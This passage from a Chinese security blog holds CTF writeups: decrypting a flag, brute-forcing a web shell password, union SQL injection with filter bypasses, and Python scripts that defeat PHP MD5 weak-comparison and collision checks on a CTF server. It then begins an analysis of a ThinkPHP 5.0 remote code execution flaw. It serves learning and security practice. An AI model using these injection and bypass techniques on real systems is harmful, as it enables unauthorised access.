$key = md5 ( $key );</span><br><span class="line">	$x = <span class="number">0</span>;</span><br><span class="line">	$len = strlen ( $data );</span><br><span class="line">	$l = strlen ( $key );</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line">		<span class="keyword">if</span> ($x == $l) &#123;</span><br><span class="line">			$x = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$char .= $key &#123;$x&#125;;</span><br><span class="line">		$x ++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line">		$str .= <span class="keyword">chr</span> ( <span class="keyword">ord</span> ( $data &#123;$i&#125; ) + (<span class="keyword">ord</span> ( $char &#123;$i&#125; )) % <span class="number">256</span> );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> base64_encode ( $str );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function decrypt($data, $key) &#123;</span><br><span class="line">	$key = md5 ( $key );</span><br><span class="line">	$x = <span class="number">0</span>;</span><br><span class="line">	$data = base64_decode ( $data );</span><br><span class="line">	$len = strlen ( $data );</span><br><span class="line">	$l = strlen ( $key );</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line">		<span class="keyword">if</span> ($x == $l) &#123;</span><br><span class="line">			$x = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$char .= <span class="keyword">substr</span> ( $key, $x, <span class="number">1</span> );</span><br><span class="line">		$x ++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $data, $i, <span class="number">1</span> ) ) &lt; <span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $char, $i, <span class="number">1</span> ) )) &#123;</span><br><span class="line">			$str .= <span class="keyword">chr</span> ( (<span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $data, $i, <span class="number">1</span> ) ) + <span class="number">256</span>) - <span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $char, $i, <span class="number">1</span> ) ) );</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$str .= <span class="keyword">chr</span> ( <span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $data, $i, <span class="number">1</span> ) ) - <span class="keyword">ord</span> ( <span class="keyword">substr</span> ( $char, $i, <span class="number">1</span> ) ) );</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key=<span class="string">"MyCTF"</span>;</span><br><span class="line">$flag=<span class="string">"o6lziae0xtaqoqCtmWqcaZuZfrd5pbI="</span>;<span class="regexp">//encrypt</span>($flag,$key)</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>有encrypt() decrypt() 两个函数 分别是加密和解密函数<br>在最下面flag 是被加密过了 又因为有解密函数，于是直接调用解密函数即可<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhopg4bij30zt0fu0uk.jpg" alt=""></p>
<h1 id="该网站已被黑"><a href="#该网站已被黑" class="headerlink" title="该网站已被黑"></a>该网站已被黑</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhqd2rcoj30w20hotbv.jpg" alt=""><br>一个炫酷的网页 被黑？ 于是拿御剑扫一下 发现shell.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vhrguismj30sj0craaa.jpg" alt=""><br>需要密码<br>用burp导入字典进行暴力得到密码为hack<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vilesi7kj30il09emx7.jpg" alt=""></p>
<h1 id="曲折的人生"><a href="#曲折的人生" class="headerlink" title="曲折的人生"></a>曲折的人生</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vimr76ubj30x60gx3zj.jpg" alt=""><br>随便输一下 发现有有回显<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vincefsuj30rt0bqq3o.jpg" alt=""><br>接下来用union注入<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vjm38ucij30yt07z3zn.jpg" alt=""><br>其中:</p>
<ol>
<li>空格被过滤  用 <code>/**/</code>  绕过</li>
<li>union,select 关键字被过滤      双写绕过</li>
</ol>
<p>得到账号密码<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户名<span class="symbol">:goodboy_g-</span><span class="number">60</span>Hellowor</span><br><span class="line"></span><br><span class="line">密码：ajahas&amp;&amp;*<span class="number">44</span>askldajaj</span><br></pre></td></tr></table></figure></p>
<p>接下来编写脚本提交</p>
<p>得到sss88ioiern.gdsgj.zip<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vkcxr20qj30j205bt8v.jpg" alt=""><br>from1.txt是用VB写的代码  转换为pytohn代码为:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def getPassword(string):</span><br><span class="line">	<span class="built_in">i</span> = <span class="number">1</span></span><br><span class="line">	reString = <span class="string">''</span></span><br><span class="line">	<span class="keyword">while</span> <span class="built_in">i</span> &lt;= len(string) :</span><br><span class="line">		reString = reString + string[<span class="built_in">i</span><span class="number">-1</span>]</span><br><span class="line">		<span class="built_in">i</span> = <span class="built_in">i</span> + (<span class="built_in">i</span> <span class="comment">% 5)</span></span><br><span class="line">	<span class="keyword">return</span> reString</span><br><span class="line"></span><br><span class="line">Dictionary = <span class="string">"VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU="</span></span><br><span class="line"></span><br><span class="line">password = getPassword(Dictionary)</span><br><span class="line">password = getPassword(password)</span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vkscaoy0j30th04udg3.jpg" alt=""><br>得到解压密码<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vkug6lydj30n0052wes.jpg" alt=""></p>
<h1 id="audit"><a href="#audit" class="headerlink" title="audit"></a>audit</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span></span><br><span class="line"><span class="php">$str1 = @$_GET[<span class="string">'str1'</span>];</span></span><br><span class="line"><span class="php">$str2 = @$_GET[<span class="string">'str2'</span>];</span></span><br><span class="line"><span class="php">$str3 = @$_GET[<span class="string">'str3'</span>];</span></span><br><span class="line"><span class="php">$str4 = @$_GET[<span class="string">'str4'</span>];</span></span><br><span class="line"><span class="php">$str5 = (string)@$_POST[<span class="string">'str5'</span>];</span></span><br><span class="line"><span class="php">$str6 = (string)@$_POST[<span class="string">'str6'</span>];</span></span><br><span class="line"><span class="php">$str7 = (string)@$_POST[<span class="string">'str7'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str1 OR Sstr2 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str3 OR str4 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str5 OR str6 OR str7 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> !($_POST[<span class="string">'b'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"come on!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = $_POST[<span class="string">'a'</span>];</span></span><br><span class="line"><span class="php">$b = $_POST[<span class="string">'b'</span>];</span></span><br><span class="line"><span class="php">$m = $_GET[<span class="string">'m'</span>];</span></span><br><span class="line"><span class="php">$n = $_GET[<span class="string">'n'</span>];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; <span class="number">6</span>))  </span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"a OR b fail!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ((strlen($m) &gt; <span class="number">4</span>) || (strlen($n) &gt; <span class="number">4</span>))  </span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"m OR n fail"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$str8 = hash(<span class="string">'md5'</span>, $a, <span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">$str9 = strtr(hash(<span class="string">'md5'</span>, $b, <span class="keyword">false</span>), $m, $n);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;str8 : $str8&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;str9 : $str9&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === <span class="number">6</span>))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"You're great,give you flag:"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>首先<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'str1 OR Sstr2 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'str3 OR str4 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里是md5弱类型比较，可用数组来绕过<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str1<span class="string">[]</span>=<span class="number">1</span>&amp;str2<span class="string">[]</span>=<span class="number">2</span>&amp;str3<span class="string">[]</span>=<span class="number">3</span>&amp;str4<span class="string">[]</span>=<span class="number">4</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1wbfr0k1zj30ra0j3mxx.jpg" alt=""></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( $str5 == $str6 <span class="params">||</span> $str5 == $str7 <span class="params">||</span> $str6 == $str7 )&#123;</span><br><span class="line">    die(<span class="string">'str5 OR str6 OR str7 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (md5($str5) !== md5($str6) <span class="params">||</span> md5($str6) !== md5($str7) <span class="params">||</span> md5($str5) !== md5($str7))&#123;</span><br><span class="line">    die(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里利用了string进行强制类型转换，我们无法用数组绕过了。只能用MD5强碰撞，要求传入三个值不能相等，但是MD5相等<br>参考:<a href="https://natmchugh.blogspot.com/2014/11/three-way-md5-collision.html" target="_blank" rel="noopener">https://natmchugh.blogspot.com/2014/11/three-way-md5-collision.html</a><br>将这三个图片文件下载下来，查看md5值<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1wbl3nu9aj30i703tq35.jpg" alt=""><br>也可以用工具；python-md5-collision 来进行生成<br>工具下载地址:<br><a href="https://github.com/thereal1024/python-md5-collision" target="_blank" rel="noopener">https://github.com/thereal1024/python-md5-collision</a><br>接下来用python来提交，脚本如下:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://120.79.1.69:10007/?str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'str5'</span>: <span class="built_in">open</span>(<span class="string">'black.jpg.coll'</span>).<span class="built_in">read</span>(),</span><br><span class="line">    <span class="string">'str6'</span>: <span class="built_in">open</span>(<span class="string">'brown.jpg.coll'</span>).<span class="built_in">read</span>(),</span><br><span class="line">    <span class="string">'str7'</span>: <span class="built_in">open</span>(<span class="string">'white.jpg.coll'</span>).<span class="built_in">read</span>()</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data = data)</span><br><span class="line"><span class="built_in">print</span> r.<span class="built_in">text</span></span><br></pre></td></tr></table></figure></p>
<p>可以看到成功饶过<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1wbv9l62wj30vb0eymzk.jpg" alt=""></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> !($_POST[<span class="string">'b'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"come on!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[<span class="string">'a'</span>];</span><br><span class="line">$b = $_POST[<span class="string">'b'</span>];</span><br><span class="line">$m = $_GET[<span class="string">'m'</span>];</span><br><span class="line">$n = $_GET[<span class="string">'n'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; <span class="number">6</span>))  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"a OR b fail!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((strlen($m) &gt; <span class="number">4</span>) || (strlen($n) &gt; <span class="number">4</span>))  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"m OR n fail"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求$a为大写字母，$b为数字、并且长度为6，$m和$n长度小于4<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://120.79.1.69:10007/?str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4&amp;m=1&amp;n=1"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'str5'</span>: <span class="built_in">open</span>(<span class="string">'black.jpg.coll'</span>).<span class="built_in">read</span>(),</span><br><span class="line">    <span class="string">'str6'</span>: <span class="built_in">open</span>(<span class="string">'brown.jpg.coll'</span>).<span class="built_in">read</span>(),</span><br><span class="line">    <span class="string">'str7'</span>: <span class="built_in">open</span>(<span class="string">'white.jpg.coll'</span>).<span class="built_in">read</span>(),</span><br><span class="line">    <span class="string">'a'</span>:<span class="string">'A'</span>,</span><br><span class="line">    <span class="string">'b'</span>:<span class="number">123456</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data = data)</span><br><span class="line"><span class="built_in">print</span> r.<span class="built_in">text</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1wc5ixr3pj310y0e876l.jpg" alt=""><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str8</span> = <span class="built_in">hash</span>(<span class="string">'md5'</span>, <span class="variable">$a</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="variable">$str9</span> = strtr(<span class="built_in">hash</span>(<span class="string">'md5'</span>, <span class="variable">$b</span>, <span class="literal">false</span>), <span class="variable">$m</span>, <span class="variable">$n</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p&gt;str8 : <span class="variable">$str8</span>&lt;/p&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p&gt;str9 : <span class="variable">$str9</span>&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$str8</span> == <span class="variable">$str9</span>) &amp;&amp; !(<span class="variable">$a</span> === <span class="variable">$b</span>) &amp;&amp; (strlen(<span class="variable">$b</span>) === 6))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"You're great,give you flag:"</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>hash()函数讲解:<br><a href="https://www.php.net/manual/zh/function.hash.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.hash.php</a></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzUzOTM4MzEyMw==&amp;mid=2247484797&amp;idx=4&amp;sn=5b752d13d4e29ebf19c43d5d9ba91385&amp;chksm=fac80141cdbf88574c8f3fb3baf2e1174f2e002e926a801201c8f9161d7c53549d9dba658adc&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;key=93ecb28c1069103a04285feb58979315a4b1749f4add40986e8814dc225f92fdbd54fa068c158a034dea2078f082317596004f0f3aca0fc76402361b547c8e2aeb5c001bbc960c35ce4996ca738f4cc3&amp;ascene=1&amp;uin=NDI2MjY3MjY%3D&amp;devicetype=Windows+10&amp;version=62060739&amp;lang=zh_CN&amp;pass_ticket=KKTGRrx8UvPH7CsKG5EoBGyRNBkVrSgQ%2F97%2BsambOvw%3D" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzUzOTM4MzEyMw==&amp;mid=2247484797&amp;idx=4&amp;sn=5b752d13d4e29ebf19c43d5d9ba91385&amp;chksm=fac80141cdbf88574c8f3fb3baf2e1174f2e002e926a801201c8f9161d7c53549d9dba658adc&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;key=93ecb28c1069103a04285feb58979315a4b1749f4add40986e8814dc225f92fdbd54fa068c158a034dea2078f082317596004f0f3aca0fc76402361b547c8e2aeb5c001bbc960c35ce4996ca738f4cc3&amp;ascene=1&amp;uin=NDI2MjY3MjY%3D&amp;devicetype=Windows+10&amp;version=62060739&amp;lang=zh_CN&amp;pass_ticket=KKTGRrx8UvPH7CsKG5EoBGyRNBkVrSgQ%2F97%2BsambOvw%3D</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/04/08/2019年掘安杯writeup/" data-id="cjvrp4gl600285gqrmw2kta3i" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Thinkphp-5-0远程代码执行漏洞" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/31/Thinkphp-5-0远程代码执行漏洞/" class="article-date">
  <time datetime="2019-03-31T07:57:43.000Z" itemprop="datePublished">2019-03-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/31/Thinkphp-5-0远程代码执行漏洞/">Thinkphp 5.0远程代码执行漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>该漏洞出现的原因在于ThinkPHP5框架底层对控制器名过滤不严，从而让攻击者可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞，</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在App.php 的run()方法中的110行<br>通过self::routerCheck函数进行路由检测<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1mvn5sojpj30mh06074o.jpg" alt=""><br>找到routercheck<br>thinkphp/library/think/App.php :606<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1m26s7a9lj30o10djabi.jpg" alt=""><br>我们可以看到又进入$request-&gt;path()函数<br>/thinkphp/library/think/Request.php 行数:416行<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1mvsgvq85j30qx0bnq3y.jpg" alt=""><br>又进入pathinfo()函数，<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m3v5wu0vj30s80fnjte.jpg" alt=""><br>Config::get(‘var_pathinfo’)是配置文件中的设置的参数，默认值为s，从GET中获取键值，然后赋值给routeCheck中的$path<br>再回到App.php，由于没有在配置文件定义任何路由，所以默认按照方式1解析调度。<br>接着调用了parseUrl()<br>在 <code>thinkphp/library/think/Route.php</code>:1208<br>从1256进行分析<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m2ct1qwij30pi0dojt1.jpg" alt=""><br>可以看到解析URL的时候只是将URL按分割符分割，并没有进行安全检测。<br>其中的路由url从Request::path()中获取<br><code>/thinkphp/library/think/Request.php</code>:<br>继续往后跟<br><code>thinkphp/library/think/App.php</code><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m3taixcwj30ou0bgjsd.jpg" alt=""></p>
